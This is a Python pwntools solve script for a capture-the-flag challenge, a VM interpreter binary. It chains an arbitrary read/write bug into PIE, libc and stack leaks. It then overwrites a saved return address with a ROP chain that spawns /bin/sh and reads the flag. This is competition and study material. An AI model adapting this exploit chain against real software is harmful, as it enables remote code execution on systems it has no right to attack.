#!/usr/bin/env python3
"""mvmph (PWN-02) — VM opcode interpreter escape via host-call arb r/w.

用法:  python3 solve.py HOST PORT     # 决赛靶机
       python3 solve.py --local [./vvmm]   # 先对附件二进制本地验证
前置: 附件解压到 CWD（libc.so.6 自动 rglob 定位）。

链条: 非法宿主调用号(99)的错误回写只覆盖 r0 低 32 位 → 与 r6(真堆指针)高 32 位
拼出 &vm->r0 → 泄漏 vm.code(PIE) 与 puts@GOT(libc) → environ 泄漏栈 →
三段返回地址特征定位当前 saved RIP → 宿主 read 覆盖成 ROP system("/bin/sh")。
"""
import struct
import sys
from pathlib import Path

from pwn import ELF, ROP, context, p64, process, remote, u64

VM_R0 = 0x5090
CODE_BUFFER = 0x50E0
PUTS_GOT = 0x4F88
CHAIN_SIZE = 5 * 8
STACK_WINDOW = 0x4000
BANNER = b"Please input your opcodes:\n"


def rr(op, dst, src):
    return bytes([(op << 2) | 2, dst, src])


def ri(op, reg, imm):
    return bytes([(op << 2) | 3, reg]) + struct.pack("<I", imm & 0xFFFFFFFF)


def ii(op, imm):
    return bytes([op << 2]) + (imm & 0xFFFFFF).to_bytes(3, "big")


mov_rr = lambda d, s: rr(3, d, s)
mov_ri = lambda d, v: ri(3, d, v)
add_ri = lambda d, v: ri(10, d, v)
sub_ri = lambda d, v: ri(11, d, v)
host_call = lambda n: ii(0x33, n)


def read_qword_into_r3():
    return b"".join([mov_rr(1, 4), add_ri(1, 0x18), mov_ri(0, 0), mov_ri(2, 8), host_call(0)])


def write_from_r3(length):
    return b"".join([mov_rr(1, 3), mov_ri(0, 1), mov_ri(2, length), host_call(1)])


def build_vm_program():
    program = [mov_rr(0, 6), host_call(99), mov_rr(4, 0)]
    program += [mov_rr(1, 4), sub_ri(1, 0x10), mov_ri(0, 1), mov_ri(2, 0x60), host_call(1)]
    program += [mov_rr(1, 4), sub_ri(1, VM_R0 - PUTS_GOT), mov_ri(0, 1), mov_ri(2, 8), host_call(1)]
    program += [read_qword_into_r3(), write_from_r3(8)]
    program += [read_qword_into_r3(), write_from_r3(STACK_WINDOW)]
    program += [read_qword_into_r3(), mov_rr(1, 3), mov_ri(0, 0), mov_ri(2, CHAIN_SIZE), host_call(0)]
    result = b"".join(program)
    assert len(result) < 0x800
    return result


def find_wrapper_return_slot(stack, stack_start, pie):
    wrapper_ret = p64(pie + 0x195B)
    interpreter_ret = p64(pie + 0x2BC3)
    main_ret = p64(pie + 0x2D8F)
    candidates = []
    for offset in range(0, len(stack) - 0x68, 8):
        if stack[offset:offset + 8] != wrapper_ret:
            continue
        if stack[offset + 0x30:offset + 0x38] != interpreter_ret:
            continue
        if stack[offset + 0x60:offset + 0x68] != main_ret:
            continue
        candidates.append(stack_start + offset)
    if len(candidates) != 1:
        raise RuntimeError(f"expected one live wrapper frame, found {candidates!r}")
    return candidates[0]


def main():
    args = sys.argv[1:]
    if args and args[0] == "--local":
        binary = args[1] if len(args) > 1 else "./vvmm"
        connect = lambda: process(binary)
    else:
        host, port = args[0], int(args[1])
        connect = lambda: remote(host, port)
    context.arch = "amd64"
    context.log_level = "info"

    libcs = sorted(Path(".").rglob("libc.so.6"))
    assert libcs, "libc.so.6 not found under CWD (unzip attachment first)"
    libc = ELF(str(libcs[0]), checksec=False)
    rop = ROP(libc)
    ret = libc.address + rop.find_gadget(["ret"]).address
    pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"]).address
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    io = connect()
    io.recvuntil(BANNER)
    io.send(build_vm_program())

    pie = u64(io.recvn(0x60)[:8]) - CODE_BUFFER
    libc.address = u64(io.recvn(8)) - libc.sym.puts
    print(f"[+] PIE base  = {pie:#x}")
    print(f"[+] libc base = {libc.address:#x}")

    io.send(p64(libc.sym.environ))
    environ_stack = u64(io.recvn(8))
    stack_start = environ_stack - STACK_WINDOW
    print(f"[+] environ   = {environ_stack:#x}")

    io.send(p64(stack_start))
    stack = io.recvn(STACK_WINDOW)
    return_slot = find_wrapper_return_slot(stack, stack_start, pie)
    print(f"[+] return slot = {return_slot:#x}")

    io.send(p64(return_slot))
    chain = b"".join([
        p64(ret), p64(pop_rdi), p64(bin_sh), p64(libc.sym.system), p64(libc.sym.exit),
    ])
    assert len(chain) == CHAIN_SIZE
    # VM read 只消费 CHAIN_SIZE 字节，随后的命令成为 /bin/sh 的 stdin
    io.send(chain + b"cat /flag*; cat ./flag*; exit\n")
    print(io.recvall(timeout=5).decode(errors="replace"))


if __name__ == "__main__":
    main()
